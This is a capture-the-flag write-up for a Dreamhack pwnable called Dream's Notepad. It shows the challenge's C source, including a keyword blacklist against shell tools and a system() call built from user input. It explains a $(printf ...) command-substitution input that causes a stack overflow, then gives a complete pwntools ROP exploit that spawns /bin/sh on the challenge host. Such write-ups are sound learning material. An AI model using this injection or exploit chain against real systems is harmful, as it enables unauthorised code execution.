---
title: "Write Up"
date: 2025-11-18 01:41:18 +0900
categories: [CTF, Dreamhack, Pwnable, Write up]
tags: []
---

# Write Up

Source code of binary is given

```
void main()
{
    Initalize();

    puts("Welcome to Dream's Notepad!\n");

    char title[10] = {0,};
    char content[64] = {0,};

    puts("-----Enter the content-----");
    read(0, content, sizeof(content) - 1);

    for (int i = 0; content[i] != 0; i++)
    {
        if (content[i] == '\n')
        {
            content[i] = 0;
            break;
        }
    }

    if(strstr(content, ".") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "/") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, ";") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "*") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "cat") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "echo") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "flag") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "sh") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "bin") != NULL) {
        puts("It can't be..");
        return;
    }

    char tmp[128] = {0,};

    sprintf(tmp, "echo %s > /home/Dnote/note", content);
    system(tmp);
    
    FILE* p = fopen("/home/Dnote/note", "r");
    unsigned int size = 0;
    if (p > 0)
    {
        fseek(p, 0, SEEK_END);
        size = ftell(p) + 1;
        fclose(p);
        remove("/home/Dnote/note");
    }

    char message[256];
    
    puts("\n-----Leave a message-----");
    read(0, message, size - 1);

    puts("\nBye Bye!!:-)");
}
```

# Primitives

There is no canary in this binary <br>

And by sending 
```
p.send(b"$(printf '%01000d' 0)")
```

we can manipulate **size** varaible => Bof + ret overwrite <br>

In this binary there are two useful gadgets: csu_init, csu_call <br>

![csuinit](/assets/img/posts/ctf-dreamhack-pwnable-write-up/DreamNotepad_csuinit.png) <br>

![csucall](/assets/img/posts/ctf-dreamhack-pwnable-write-up/DreamNotepad_csucall.png) <br>

With these two gadgets, we can call functions whatever we want!! <br>

# Exploit

1. By calling **read(0,bss,8)** => Make /bin/sh string 
2. call system(/bin/sh)

Exploit Code is like this

```
from pwn import *
context.log_level = 'debug'
p = remote('host8.dreamhack.games', 14070)
e = ELF('./Notepad')
libc = e.libc
bss = p64(e.bss())

csu_init = p64(0x400c6a)
csu_call = p64(0x400c50)
ret = p64(0x400c8c)

p.recvuntil("----\n")
p.send(b"$(printf '%01000d' 0)")

p.recvuntil("----\n")

payload = b'A' * 488
payload += csu_init
payload += p64(0)
payload += p64(1)
payload += p64(e.got['read'])
payload += p64(8)
payload += bss
payload += p64(0)
payload += csu_call

payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(e.got['system'])
payload += p64(0)
payload += p64(0)
payload += bss
payload += ret
payload += csu_call

p.sendline(payload)

time.sleep(1)

p.send('/bin/sh\x00')

p.interactive()

```

Things I learned: Do not trust ropr <br>

![ropr](/assets/img/posts/ctf-dreamhack-pwnable-write-up/DreamNotepad_ropr.png) <br>

I couldn't find **pop rbx** only with the result of ropr....